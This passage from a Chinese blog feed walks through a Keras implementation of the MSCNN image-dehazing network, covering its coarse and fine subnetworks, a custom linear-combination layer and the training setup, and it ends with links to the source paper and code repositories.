class="string">&#x27;coarse_net.h5&#x27;</span></span><br><span class="line">self.fine_model_name = <span class="string">&#x27;fine_net.h5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置超参数</span></span><br><span class="line">self.batch_size = batch_size</span><br><span class="line">self.epochs = epochs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入图片信息</span></span><br><span class="line">self.img_height = <span class="number">240</span></span><br><span class="line">self.img_width = <span class="number">320</span></span><br><span class="line">self.channel = <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="4-2-建立coraseNet"><a href="#4-2-建立coraseNet" class="headerlink" title="4.2 建立coraseNet"></a>4.2 建立coraseNet</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_build_coarseNet</span>(<span class="params">self, input_img</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    建立coarseNet</span></span><br><span class="line"><span class="string">    :param input_img: 输入图片的tensor</span></span><br><span class="line"><span class="string">    :return: coarseNet</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    conv1 = Conv2D(<span class="number">5</span>, (<span class="number">11</span>, <span class="number">11</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv1&#x27;</span>)(input_img)</span><br><span class="line">    pool1 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool1&#x27;</span>)(conv1)</span><br><span class="line">    upsample1 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample1&#x27;</span>)(pool1)</span><br><span class="line">    normalize1 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;coarseNet/bn1&#x27;</span>)(upsample1)</span><br><span class="line">    <span class="comment"># dropout1 = Dropout(0.5, name=&#x27;coarseNet/dropout1&#x27;)(normalize1)</span></span><br><span class="line"></span><br><span class="line">    conv2 = Conv2D(<span class="number">5</span>, (<span class="number">9</span>, <span class="number">9</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv2&#x27;</span>)(normalize1)</span><br><span class="line">    pool2 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool2&#x27;</span>)(conv2)</span><br><span class="line">    upsample2 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample2&#x27;</span>)(pool2)</span><br><span class="line">    normalize2 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;coarseNet/bn2&#x27;</span>)(upsample2)</span><br><span class="line">    <span class="comment"># dropout2 = Dropout(0.5, name=&#x27;coarseNet/dropout2&#x27;)(normalize2)</span></span><br><span class="line"></span><br><span class="line">    conv3 = Conv2D(<span class="number">10</span>, (<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv3&#x27;</span>)(normalize2)</span><br><span class="line">    pool3 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool3&#x27;</span>)(conv3)</span><br><span class="line">    upsample3 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample3&#x27;</span>)(pool3)</span><br><span class="line">    <span class="comment"># dropout3 = Dropout(0.5, name=&#x27;coarseNet/dropout3&#x27;)(upsample3)</span></span><br><span class="line"></span><br><span class="line">    linear = LinearCombine(<span class="number">1</span>,name=<span class="string">&#x27;coarseNet/linear_combine&#x27;</span>)(upsample3)</span><br><span class="line">    <span class="keyword">return</span> linear</span><br></pre></td></tr></table></figure><p><code>LinearCombine</code>为一个自定义层:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinearCombine</span>(<span class="params">Layer</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    paper 中的线性结合层</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, output_dim,**kwargs</span>):</span></span><br><span class="line">        self.output_dim = output_dim</span><br><span class="line">        super(LinearCombine, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">self, input_shape</span>):</span></span><br><span class="line">        self.kernel = self.add_weight(name=<span class="string">&#x27;kernel&#x27;</span>,</span><br><span class="line">                                      trainable=<span class="literal">True</span>,</span><br><span class="line">                                      shape=(input_shape[<span class="number">3</span>],),</span><br><span class="line">                                      initializer=<span class="string">&#x27;uniform&#x27;</span>)</span><br><span class="line">        self.biases = self.add_weight(name=<span class="string">&#x27;bias&#x27;</span>,</span><br><span class="line">                                      trainable=<span class="literal">True</span>,</span><br><span class="line">                                      shape=(self.output_dim,),</span><br><span class="line">                                      initializer=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">        super(LinearCombine, self).build(input_shape)  <span class="comment"># Be sure to call this at the end</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, inputs, **kwargs</span>):</span></span><br><span class="line">        out = K.bias_add(</span><br><span class="line">            K.sum(tf.multiply(inputs, self.kernel), axis=<span class="number">3</span>),</span><br><span class="line">            self.biases</span><br><span class="line">        )</span><br><span class="line">        out = K.expand_dims(out,axis=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> K.sigmoid(out)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_output_shape</span>(<span class="params">self, input_shape</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (input_shape[<span class="number">0</span>],input_shape[<span class="number">1</span>],input_shape[<span class="number">2</span>],self.output_dim)</span><br></pre></td></tr></table></figure><h3 id="4-3-建立FineNet"><a href="#4-3-建立FineNet" class="headerlink" title="4.3 建立FineNet"></a>4.3 建立FineNet</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_build_fineNet</span>(<span class="params">input_img, coarseNet</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    建立fineNet</span></span><br><span class="line"><span class="string">    :param input_img: 输入图片的tensor</span></span><br><span class="line"><span class="string">    :param coarseNet: coarseNet的Tensor</span></span><br><span class="line"><span class="string">    :return: fineNet</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># paper中的fine net 卷积kernel为4. 但经查看作者提供的源代码，第一层设置的6</span></span><br><span class="line">    conv1 = Conv2D(<span class="number">6</span>, (<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;fineNet/conv1&#x27;</span>)(input_img)</span><br><span class="line">    pool1 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool1&#x27;</span>)(conv1)</span><br><span class="line">    upsample1 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample1&#x27;</span>)(pool1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 级联coarseNet</span></span><br><span class="line">    concat = concatenate([upsample1, coarseNet], axis=<span class="number">3</span>, name=<span class="string">&#x27;concat&#x27;</span>)</span><br><span class="line">    normalize1 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;fineNet/bn1&#x27;</span>)(concat)</span><br><span class="line">    <span class="comment"># dropout1 = Dropout(0.5, name=&#x27;fineNet/dropout1&#x27;)(normalize1)</span></span><br><span class="line"></span><br><span class="line">    conv2 = Conv2D(<span class="number">5</span>, (<span class="number">5</span>, <span class="number">5</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,name=<span class="string">&#x27;fineNet/conv2&#x27;</span>)(normalize1)</span><br><span class="line">    pool2 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool2&#x27;</span>)(conv2)</span><br><span class="line">    upsample2 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample2&#x27;</span>)(pool2)</span><br><span class="line">    normalize2 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;fineNet/bn2&#x27;</span>)(upsample2)</span><br><span class="line">    <span class="comment"># dropout2 = Dropout(0.5, name=&#x27;fineNet/dropout2&#x27;)(normalize2)</span></span><br><span class="line"></span><br><span class="line">    conv3 = Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,name=<span class="string">&#x27;fineNet/conv3&#x27;</span>)(normalize2)</span><br><span class="line">    pool3 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool3&#x27;</span>)(conv3)</span><br><span class="line">    upsample3 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample3&#x27;</span>)(pool3)</span><br><span class="line">    <span class="comment"># dropout3 = Dropout(0.5, name=&#x27;fineNet/dropout3&#x27;)(upsample3)</span></span><br><span class="line"></span><br><span class="line">    linear = LinearCombine(<span class="number">1</span>, name=<span class="string">&#x27;fineNet/linear_combine&#x27;</span>)(upsample3)</span><br><span class="line">    <span class="keyword">return</span> linear</span><br></pre></td></tr></table></figure><h3 id="4-4-设置训练的参数"><a href="#4-4-设置训练的参数" class="headerlink" title="4.4  设置训练的参数"></a>4.4  设置训练的参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置优化器，损失函数等</span></span><br><span class="line">self.optimizer = SGD(learning_rate,<span class="number">0.9</span>,<span class="number">0.0005</span>)</span><br><span class="line"><span class="comment"># self.optimizer = Adam(learning_rate, decay=1e-6)</span></span><br><span class="line">self.loss = mse</span><br><span class="line"></span><br><span class="line">self.coarseModel.compile(optimizer=self.optimizer,</span><br><span class="line">                         loss=self.loss)</span><br><span class="line">self.fineModel.compile(optimizer=self.optimizer,</span><br><span class="line">                       loss=self.loss)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-5-全代码"><a href="#4-5-全代码" class="headerlink" title="4.5  全代码"></a>4.5  全代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">网络模型搭建</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> keras.engine.topology <span class="keyword">import</span> Layer</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Conv2D, MaxPooling2D, UpSampling2D, Input, BatchNormalization</span><br><span class="line"><span class="keyword">from</span> keras.layers.merge <span class="keyword">import</span> concatenate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_net_model</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    建立paper中的MSCNN</span></span><br><span class="line"><span class="string">    :return: corseModel和fineModel的元祖</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    img_height = <span class="number">240</span></span><br><span class="line">    img_width = <span class="number">320</span></span><br><span class="line">    channel = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通用输入</span></span><br><span class="line">    input_img = Input((img_height, img_width, channel))</span><br><span class="line">    coarseNet = _build_coarseNet(input_img)</span><br><span class="line">    fineNet = _build_fineNet(input_img, coarseNet)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 建立coarse Model和fine Model</span></span><br><span class="line">    coarseModel = Model(inputs=input_img, outputs=coarseNet)</span><br><span class="line">    fineModel = Model(inputs=input_img, outputs=fineNet)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># summary</span></span><br><span class="line">    coarseModel.summary()</span><br><span class="line">    fineModel.summary()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (coarseModel, fineModel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_build_coarseNet</span>(<span class="params">input_img</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    建立coarseNet</span></span><br><span class="line"><span class="string">    :param input_img: 输入图片的tensor</span></span><br><span class="line"><span class="string">    :return: coarseNet</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    conv1 = Conv2D(<span class="number">5</span>, (<span class="number">11</span>, <span class="number">11</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv1&#x27;</span>)(input_img)</span><br><span class="line">    pool1 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool1&#x27;</span>)(conv1)</span><br><span class="line">    upsample1 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample1&#x27;</span>)(pool1)</span><br><span class="line">    normalize1 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;coarseNet/bn1&#x27;</span>)(upsample1)</span><br><span class="line">    <span class="comment"># dropout1 = Dropout(0.5, name=&#x27;coarseNet/dropout1&#x27;)(normalize1)</span></span><br><span class="line"></span><br><span class="line">    conv2 = Conv2D(<span class="number">5</span>, (<span class="number">9</span>, <span class="number">9</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv2&#x27;</span>)(normalize1)</span><br><span class="line">    pool2 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool2&#x27;</span>)(conv2)</span><br><span class="line">    upsample2 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample2&#x27;</span>)(pool2)</span><br><span class="line">    normalize2 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;coarseNet/bn2&#x27;</span>)(upsample2)</span><br><span class="line">    <span class="comment"># dropout2 = Dropout(0.5, name=&#x27;coarseNet/dropout2&#x27;)(normalize2)</span></span><br><span class="line"></span><br><span class="line">    conv3 = Conv2D(<span class="number">10</span>, (<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;coarseNet/conv3&#x27;</span>)(normalize2)</span><br><span class="line">    pool3 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/pool3&#x27;</span>)(conv3)</span><br><span class="line">    upsample3 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;coarseNet/upsample3&#x27;</span>)(pool3)</span><br><span class="line">    <span class="comment"># dropout3 = Dropout(0.5, name=&#x27;coarseNet/dropout3&#x27;)(upsample3)</span></span><br><span class="line"></span><br><span class="line">    linear = LinearCombine(<span class="number">1</span>, name=<span class="string">&#x27;coarseNet/linear_combine&#x27;</span>)(upsample3)</span><br><span class="line">    <span class="keyword">return</span> linear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_build_fineNet</span>(<span class="params">input_img, coarseNet</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    建立fineNet</span></span><br><span class="line"><span class="string">    :param input_img: 输入图片的tensor</span></span><br><span class="line"><span class="string">    :param coarseNet: coarseNet的Tensor</span></span><br><span class="line"><span class="string">    :return: fineNet</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># paper中的fine net 卷积kernel为4. 但经查看作者提供的源代码，第一层设置的6</span></span><br><span class="line">    conv1 = Conv2D(<span class="number">6</span>, (<span class="number">7</span>, <span class="number">7</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, name=<span class="string">&#x27;fineNet/conv1&#x27;</span>)(input_img)</span><br><span class="line">    pool1 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool1&#x27;</span>)(conv1)</span><br><span class="line">    upsample1 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample1&#x27;</span>)(pool1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 级联coarseNet</span></span><br><span class="line">    concat = concatenate([upsample1, coarseNet], axis=<span class="number">3</span>, name=<span class="string">&#x27;concat&#x27;</span>)</span><br><span class="line">    normalize1 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;fineNet/bn1&#x27;</span>)(concat)</span><br><span class="line">    <span class="comment"># dropout1 = Dropout(0.5, name=&#x27;fineNet/dropout1&#x27;)(normalize1)</span></span><br><span class="line"></span><br><span class="line">    conv2 = Conv2D(<span class="number">5</span>, (<span class="number">5</span>, <span class="number">5</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,name=<span class="string">&#x27;fineNet/conv2&#x27;</span>)(normalize1)</span><br><span class="line">    pool2 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool2&#x27;</span>)(conv2)</span><br><span class="line">    upsample2 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample2&#x27;</span>)(pool2)</span><br><span class="line">    normalize2 = BatchNormalization(axis=<span class="number">3</span>, name=<span class="string">&#x27;fineNet/bn2&#x27;</span>)(upsample2)</span><br><span class="line">    <span class="comment"># dropout2 = Dropout(0.5, name=&#x27;fineNet/dropout2&#x27;)(normalize2)</span></span><br><span class="line"></span><br><span class="line">    conv3 = Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,name=<span class="string">&#x27;fineNet/conv3&#x27;</span>)(normalize2)</span><br><span class="line">    pool3 = MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/pool3&#x27;</span>)(conv3)</span><br><span class="line">    upsample3 = UpSampling2D((<span class="number">2</span>, <span class="number">2</span>), name=<span class="string">&#x27;fineNet/upsample3&#x27;</span>)(pool3)</span><br><span class="line">    <span class="comment"># dropout3 = Dropout(0.5, name=&#x27;fineNet/dropout3&#x27;)(upsample3)</span></span><br><span class="line"></span><br><span class="line">    linear = LinearCombine(<span class="number">1</span>, name=<span class="string">&#x27;fineNet/linear_combine&#x27;</span>)(upsample3)</span><br><span class="line">    <span class="keyword">return</span> linear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinearCombine</span>(<span class="params">Layer</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    paper 中的线性结合层</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, output_dim, **kwargs</span>):</span></span><br><span class="line">        self.output_dim = output_dim</span><br><span class="line">        super(LinearCombine, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">self, input_shape</span>):</span></span><br><span class="line">        self.kernel = self.add_weight(name=<span class="string">&#x27;kernel&#x27;</span>,</span><br><span class="line">                                      trainable=<span class="literal">True</span>,</span><br><span class="line">                                      shape=(input_shape[<span class="number">3</span>],),</span><br><span class="line">                                      initializer=<span class="string">&#x27;uniform&#x27;</span>)</span><br><span class="line">        self.biases = self.add_weight(name=<span class="string">&#x27;bias&#x27;</span>,</span><br><span class="line">                                      trainable=<span class="literal">True</span>,</span><br><span class="line">                                      shape=(self.output_dim,),</span><br><span class="line">                                      initializer=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">        super(LinearCombine, self).build(input_shape)  <span class="comment"># Be sure to call this at the end</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, inputs, **kwargs</span>):</span></span><br><span class="line">        out = K.bias_add(</span><br><span class="line">            K.sum(tf.multiply(inputs, self.kernel), axis=<span class="number">3</span>),</span><br><span class="line">            self.biases</span><br><span class="line">        )</span><br><span class="line">        out = K.expand_dims(out, axis=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> K.sigmoid(out)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compute_output_shape</span>(<span class="params">self, input_shape</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (input_shape[<span class="number">0</span>], input_shape[<span class="number">1</span>], input_shape[<span class="number">2</span>], self.output_dim)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-6-其他"><a href="#4-6-其他" class="headerlink" title="4.6 其他"></a>4.6 其他</h3><p>代码中还有很多需要注意的地方，如接力学习，训练数据对的统一化处理，显存不足时，不应当将所有图片一次性加入到内存中，而应该采用generator的方式来训练，train过程多少epoch或batch需要sample一次等等。这些代码都可以参考文末的总代码，这里不可能一一道尽。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNwcmluZ2VyLmNvbS9jaGFwdGVyLzEwLjEwMDcvOTc4LTMtMzE5LTQ2NDc1LTZfMTA=" title="https://link.springer.com/chapter/10.1007/978-3-319-46475-6_10">Single Image Dehazing via Multi-scale Convolutional Neural Networks<i class="fa fa-external-link"></i></span></li></ol><p>所有源代码地址:</p><ol><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWRlaGF6ZS13b3JrL01TQ05OX0tlcmFz" title="https://github.com/raven-dehaze-work/MSCNN_Keras">https://github.com/raven-dehaze-work/MSCNN_Keras<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWRlaGF6ZS13b3JrL01TQ05OX01BVExBQg==" title="https://github.com/raven-dehaze-work/MSCNN_MATLAB">https://github.com/raven-dehaze-work/MSCNN_MATLAB<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rpc2hhbmstYi9NU0NOTi1EZWhhemluZy1UZW5zb3JmbG93" title="https://github.com/dishank-b/MSCNN-Dehazing-Tensorflow">https://github.com/dishank-b/MSCNN-Dehazing-Tensorflow<i class="fa fa-external-link"></i></span></li></ol>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结二-论文复现工作1-暗通道去雾(DCP)</title>
      <link href="/archives/81fcc536.html"/>
      <url>/archives/81fcc536.html</url>
      
